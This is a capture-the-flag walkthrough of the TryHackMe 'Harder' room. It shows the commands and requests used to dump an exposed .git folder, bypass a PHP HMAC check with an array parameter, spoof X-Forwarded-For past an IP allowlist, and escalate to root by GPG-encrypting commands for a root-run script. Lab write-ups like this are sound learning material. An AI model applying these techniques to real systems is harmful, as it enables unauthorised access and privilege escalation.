---
title: "TryHackMe: Harder Walkthrough WriteUp"
layout: default
published: true
---

We have an IP as usual, and we can start with the basic nmap scan - `nmap -oN nmap-basic -vv IP`
```shell
PORT      STATE    SERVICE        REASON      VERSION
22/tcp    open     ssh            syn-ack     OpenSSH 8.3 (protocol 2.0)
80/tcp    open     http           syn-ack     nginx 1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0
|_http-title: Error
```
We have two ports open, one nginx server and another SSH.

So, let's take a step back and read the description of the machine.
```
Hints to the initial foodhold: Look closely at every request. Re-scan all newly found web services/folders and may use some wordlists from seclists.
```
We have to look closely at every request, so let's do that...and there we find some interesting stuff
```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sun, 16 Aug 2020 11:04:15 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
X-Powered-By: PHP/7.3.19
Set-Cookie: TestCookie=just+a+test+cookie; expires=Sun, 16-Aug-2020 12:04:15 GMT; Max-Age=3600; path=/; domain=pwd.harder.local; secure
Content-Encoding: gzip
```

Here we can see in the Set-Cookie attribute we have values and a DOMAIN. What we can do is, go to the `/etc/hosts` and add the following line to it,
```shell
$ sudo echo "IP     pwd.harder.local" >> /etc/hosts
```
and visit http://pwd.harder.local in the web browser and this will open up a new page that is asking for credentials. Let's try and bruteforce the creds, by manually trying some creds - admin:admin - gave us some different responses. So we will try to bruteforce the password using the username as `admin` but we didn't get much benefit.
Let's try and run gobuster, to see if we get anything, and we get a .git folder and we are supposed to enumerate this directory to get information, let's do it!

In order to dump that .git directory to our local system, this [tool](https://github.com/internetwache/GitTools.git) can be used! Once we have a .git directory we can use git commands to look for whatever we have in there.
```shell
$ ./gitdumper.sh pwd.harder.local/.git/ ~/CTF/thm/harder/git
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating /home/cardinal/CTF/thm/harder/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
...
```

and we get the files using,
```shell
$ git checkout .
Updated 4 paths from the index
$ ls -la
total 48
drwxrwxr-x 3 cardinal cardinal  4096 Aug 17 02:53 .
drwxrwxr-x 3 cardinal cardinal  4096 Aug 17 02:46 ..
-rw-rw-r-- 1 cardinal cardinal 23820 Aug 17 02:53 auth.php
drwxrwxr-x 6 cardinal cardinal  4096 Aug 17 02:53 .git
-rw-rw-r-- 1 cardinal cardinal    27 Aug 17 02:53 .gitignore
-rw-rw-r-- 1 cardinal cardinal   431 Aug 17 02:53 hmac.php
-rw-rw-r-- 1 cardinal cardinal   608 Aug 17 02:53 index.php
```

We have a few interesting files now, with us...let's start with `gitignore` file.
```shell
$ cat .gitignore
credentials.php
secret.php
```
And these look so interesting! Let's keep these aside for a while and let's look at the source code of the files we have!

`auth.php` - has some basic cookie setting and stuff...nothing interesting!
`index.php` - nothing interesting either, but
`hmac.php` - is what I found out to be most interesting.


```php
<?php
if (empty($_GET['h']) || empty($_GET['host'])) {
   header('HTTP/1.0 400 Bad Request');
   print("missing get parameter");
   die();
}
require("secret.php"); //set $secret var
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', $_GET['n'], $secret);
}

$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']){
  header('HTTP/1.0 403 Forbidden');
  print("extra security check failed");
  die();
}
?>
```

Studying the code and breaking my head on it, I found out that `hash_hmac` function can be used to our benefit. According to the [function's defintion](https://www.php.net/manual/en/function.hash-hmac.php), this function takes strings as it's parameter and if something is wrong it gives us boolean value - false.
<br><br>
So, we can force this function to generate false as it's output, using the `n` parameter. If `n` is set then the $secret will contain some value, so using the above information let's see what we can do. And after we get the value for $secret as `false`. We can then bypass other if-else branch and get access to the system using `h` and `host` parameters as such,
<br><br>
What we have to do is, pass false and generate the value for `$hm` with some hosts, as such
```php
# generatehash.php
  1 <?php
  2 $secret = hash_hmac('sha256','hacker.com',false);
  3 print($secret)
  4 ?>

# Output : e86f889ce1872bcb2d54e7145c1a4b4d85ee32fdf4223ac345106a212f70b2bc
```
So we can craft a url request, which has,
* n[]=[1]
* h=e86f889ce1872bcb2d54e7145c1a4b4d85ee32fdf4223ac345106a212f70b2bc
* host=hacker.com
```url
pwd.harder.local/index.php?n[]=0&h=e86f889ce1872bcb2d54e7145c1a4b4d85ee32fdf4223ac345106a212f70b2bc&host=hacker.com
```

And after so much of struggle, we have something,
|url                     |username     |password (cleartext)            |
| --------------------- |:---------:|--------------------------------|
|http://shell.harder.htb|     evs     |xxxxxxxxxxxxxxxxxxxxxxxxxx|

We have a new virtual host and a new set of credentials, let's add this host again into /etc/hosts and see what we have!
The above creds don't work on the login page of `pwd.harder.local`, it must only work with the specified url, let's try that!

This virtual host doesn't seem to work!!!!! Gives the same 404 error! Why it's `htb` there in the domain? We can try changing that to `local` and see if that works! Yay!! It works!!!!!

We have a login page and we are into the system with the provided creds. And another hurdle slammed us in our face,
```
Your IP is not allowed to use this web service. Only 10.10.10.x is allowed
```

We can easily bypass this by using `X-Forwarded-For` to what it says: 10.10.10.x, let x be 100! Mathematical nostalgia! LOL
Let's fire-up the burp and go to `options` of Proxy tab and add a new record to `Match and Replace`,
```
Type: Request Header
Match:
Replace: X-Forwarded-For: 10.10.10.100
```
and add this record, what this will do is append `X-Forwarded-For: 10.10.10.100` to each and every request header and that will suffice our purpose!
```
GET /index.php HTTP/1.1
Host: shell.harder.local
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=q9hkku720p6bmkt998gcipo1sd
Connection: close
X-Forwarded-For: 10.10.10.100
```
And we have a place to execute the shell commands! Let's enumerate the system!


In the user(evs)'s directory we get our user flag and now we need to find a way to escalate privilege. Let do some more enumeration and search for vulnerable stuff.

We use find command to search for the stuff that belongs to the user `www` and we got some data and the most interesting was,
```shell
$ find / -user www
...
/etc/periodic/15min/evs-backup.sh
...
```
And we get the ssh cred from viewing that file!!! Awesome!!
```
#!/bin/ash

# ToDo: create a backup script, that saves the /www directory to our internal server
# for authentication use ssh with user "evs" and password "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"

```
We can now ssh on `pwd.harder.local` to get access to the machine!
<br>
While enumerating the machine, I used `find` command to get `sh` files and one of them looks intersting,
```shell
harder:~$ find / -type f -name "*.sh" 2> /dev/null
/usr/bin/findssl.sh
/usr/local/bin/run-crypted.sh           <---
/etc/periodic/15min/evs-backup.sh

harder:~$ ls -la /usr/local/bin/run-crypted.sh
-rwxr-x---    1 root     evs            412 Jul  7 20:58 /usr/local/bin/run-crypted.sh
harder:~$
harder:~$ cat /usr/local/bin/run-crypted.sh
#!/bin/sh

if [ $# -eq 0 ]
  then
    echo -n "[*] Current User: ";
    whoami;
    echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."
    echo "[-] Create a file like this: echo -n whoami > command"
    echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
  else
    export GNUPGHOME=/root/.gnupg/
    gpg --decrypt --no-verbose "$1" | ash
fi

```
After reading this script, I think there should be a gpg key somewhere and we need to find it, in order to run commands as root.
```shell
harder:~$ find / -name root@harder.local* 2> /dev/null
/var/backup/root@harder.local.pub
```
We have the key, what we need to do now is import the gpg key, so that we can encrypt the command and run through root.
```shell
harder:~$ gpg --import /var/backup/root@harder.local.pub
gpg: directory '/home/evs/.gnupg' created
gpg: keybox '/home/evs/.gnupg/pubring.kbx' created
gpg: /home/evs/.gnupg/trustdb.gpg: trustdb created
gpg: key C91D6615944F6874: public key "Administrator <root@harder.local>" imported
gpg: Total number processed: 1
gpg:               imported: 1
```

Now, we have to encrypt the command using gpg key,
```shell
harder:~$ echo -n cat /root/root.txt > command # Made a file containing command
harder:~$ gpg -er root command # Encrypted using gpg key and as root
gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user

sub  cv25519/6C1C04522C049868 2020-07-07 Administrator <root@harder.local>
 Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874
      Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868

It is NOT certain that the key belongs to the person named
in the user ID.  If you *really* know what you are doing,
you may answer the next question with yes.

Use this key anyway? (y/N) y
harder:~$ ls
command      command.gpg  nc           user.txt
harder:~$ execute-crypted command.gpg
gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07
      "Administrator <root@harder.local>"
{root_flag}
```

And we get the key! There are a few concepts that are complicated but this one was a really great learning experience! Loved it!

Machine Pwned!

Link: https://tryhackme.com/room/harder
